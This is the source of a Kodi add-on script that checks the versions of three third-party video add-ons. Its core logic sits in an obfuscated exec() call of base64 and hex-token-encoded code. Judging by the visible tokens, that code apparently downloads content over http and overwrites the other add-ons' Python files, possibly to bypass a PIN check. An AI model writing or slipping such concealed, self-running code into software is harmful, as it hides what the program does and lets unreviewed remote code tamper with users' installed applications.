import xbmc,xbmcaddon,xbmcvfs,xbmcgui
import os, re, requests, sys
from contextlib import contextmanager

action = sys.argv[1]
addonbase = xbmcaddon.Addon('plugin.program.downloader')
addon_nemesis = xbmcaddon.Addon('plugin.video.nemesisaio')
addon_EntertainMe = xbmcaddon.Addon('plugin.video.EntertainMe')
addon_fmovies = xbmcaddon.Addon('plugin.video.fmoviesto')
fix_neme_ver = addonbase.getSetting('okpnneme')
if fix_neme_ver == '' or fix_neme_ver is None:
    fix_neme_ver = '0'
fix_enter_ver = addonbase.getSetting('okpnenter')
if fix_enter_ver == '' or fix_enter_ver is None:
    fix_enter_ver = '0'
fix_fmovies_ver = addonbase.getSetting('okpnfmovies')
if fix_fmovies_ver == '' or fix_fmovies_ver is None:
    fix_fmovies_ver = '0'
neme_ver = addon_nemesis.getAddonInfo('version')
enter_ver = addon_EntertainMe.getAddonInfo('version')
fmovies_ver = addon_fmovies.getAddonInfo('version')


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

def openfile(path_to_the_file):
    try:
        fh = xbmcvfs.File(path_to_the_file)
        contents=fh.read()
        fh.close()
        return contents
    except:
        print("Wont open: %s" % path_to_the_file)
        return None

def savefile(path_to_the_file,content):
    try:
        fh = xbmcvfs.File(path_to_the_file, 'w')
        fh.write(content)  
        fh.close()
    except: print("Wont save: %s" % path_to_the_file)

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MzAoIjUxIDNjOzUxIGMiKTszMCgoN2YgNzUsN2E6KDdmIDZmLGIsZjozYy42NSg2ZixiLGYuZSgnM2EtOCcpKSkoN2QiKFswLTZjLWZdKykiLDdmIDc4Ojc1KDc4LDdhKSxjLjI5KCI3Mz0iKSkpKDdmIGEsYjpiWzY5KCI3NiIrYS40YigxKSwxNildLCIwfDE4fDZlfDI3fDV8MWZ8MnwxY3w4fDQwfDd8NTB8NmR8MTN8MmZ8ZnwxMHwyMXwyMnw0ZnwyYXwyZHwzZnwxMnwxN3wyNXwyM3wyNnwzfDJifDdifDR8NDV8NnwzM3wzNXw3NHw5fDc3fDU1fDY3fGR8NDF8MTF8MTR8MTV8NDR8MTl8MWJ8MWR8N2N8NGN8NjN8MjB8NjR8MjR8Mjh8NGR8NGV8NTd8MmN8NTl8NWJ8MmV8NjJ8MzF8MzR8MzZ8Mzd8Mzh8Mzl8NzB8M2R8NzJ8Njh8M2V8M2J8NmF8ZXw0Mnw0M3w0Nnw0N3w0OXw0YXw1OHw1Znw1ZXw1Y3w1Mnw1M3w1Nnw1YXw1ZHw1NHw2MHw2MXwzYXw2Nnw2YnwzY3wxZXw3MXw3OXwxYXw3ZXwzMiIuNDgoInwiKSkp")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|addon_EntertainMe|getCondVisibility|fix_fmovies_ver|executebuiltin|AddonIsEnabled|addon_nemesis|8|addon_fmovies|a|b|base64|fix_neme_ver|decode|f|10|busy_dialog|fmovies_ver|okpnfmovies|updatecheck|EntertainMe|16|getSetting|newcontent|nemesisaio|basepypath|downloader|setSetting|repository|okpnenter|addonPath|addonname|addonbase|enter_ver|resources|gknwizard|jfilename|pinstatus|addonInfo|fmoviesto|b64decode|openfile|jsondata|requests|okpnneme|savefile|neme_ver|exec|content|xbmcvfs|replace|special|fixpath|findall|timeout|nemesis|program|utf|except|re|System|addons|plugin|action|Passed|Builds|fixen|match|video|write|loads|split|GKoBu|gkobu|group|sleep|elif|File|path|translatePath|import|http|main|repo|join|okpn|json|libs|else|xmls|pass|load|home|xbmc|copy|open|name|with|def|not|sub|try|pin|300|int|str|get|9a|getAddonInfo|basecontent|o|os|eu|py|MzQgMTUoKToKCTQwIDJiKCk6CgkJMWUgMjkgPCBlOgoJCQkzID0gYS5jCgkJCTUgPSA2YS5iKDMoJzEzJykpCgkJCTY4ID0gNDcuMTMuMjcoNSwnNDUuNDknKQoJCQkzNSA9IDMoJzYwJykKCQkJMWIgPSBhLjE4KCcyOCcpCgkJCTIgPSAxNCg2OCkKCQkJMWUgMzYgZSAzMiAyOgoJCQkJNjI6CgkJCQkJMSA9IDNjLjYzKCc1OTovLzM3LjY2LzVlLzRmLzUzLzVjLzViJywgNDQ9MTApLjQxCgkJCQkJMSA9IDEuNGUoJzYxLTgnKQoJCQkJCTJlID0gNjQuNDMoJyMjKC4rPykjIycsIDEpWzBdCgkJCQkJMWUgMzYgNGQoMmUpIDwgNGQoZSk6CgkJCQkJCTNmKDY4LDEpCgkJCQkJCTU3LjMzKDRhKQoJCQkJCQlhLjcoJzI4JywgJzJhJykKCQkJCQkJMTEuNygnMTUnLCBlKQoJCQkJNGMgMjY6CgkJCQkJM2UKCgk1Ny40KDkpCgoKMzQgNjUoKToKCTFlIDI0IDwgMTI6CgkJMyA9IDYuYwoJCTUgPSA2YS5iKDMoJzEzJykpCgkJNjggPSA0Ny4xMy4yNyg1LCcxYScsICc1NScsICcyYy40OScpCgkJMjMgPSAnNDI6Ly81ZC80Yi8xNi40Ni4zMC8xYS81MCcKCQkxYiA9IDYuMTgoJzI4JykKCQkyID0gMTQoNjgpCgkJMWUgMzYgMTIgMzIgMjoKCQkJNmEuNTYoMjMsIDY4KQoJCQk1Ny4zMyg0YSkKCQkJNi43KCcyOCcsICcyYScpCgkJCTExLjcoJzY1JywgMTIpCgoJNTcuNCg5KQoKMzQgZCgpOgoJMWUgMWYgPCAxNzoKCQkzID0gMjUuYwoJCTUgPSA2YS5iKDMoJzEzJykpCgkJNjggPSA0Ny4xMy4yNyg1LCc1YS40OScpCgkJMiA9IDE0KDY4KQoJCTEgPSAyLjIyKCc1ZigxOSknLCAnNmEuM2EoMTkpJykuMjIoJzFkID0gM2IuNTIoZiknLCAnMWQgPSAzYi41OChmKScpCgkJNDAgNmEuM2EoNjgsICc2OScpIDY3IGY6CgkJCWYuNTEoMSkKCQkxMS43KCdkJywgMTcpCgoJNTcuNCg5KQoKMWUgNTcuMWMoJzQ4LjIxKDMxLjU0KScpOgoJMWUgJzE2LjIwLjJmJyAzMiA5OgoJCTE1KCkKCTM5ICcxNi4yMC4yZCcgMzIgOToKCQk2NSgpCgkzOSAnMTYuMjAuMzgnIDMyIDk6CgkJZCgpCgkzZDoKCQk1Ny40KDkpCjNkOgoJM2U|fix_enter_ver|p|0x|BaseException|m|as|y|if|in|r|w|lambda".split("|")))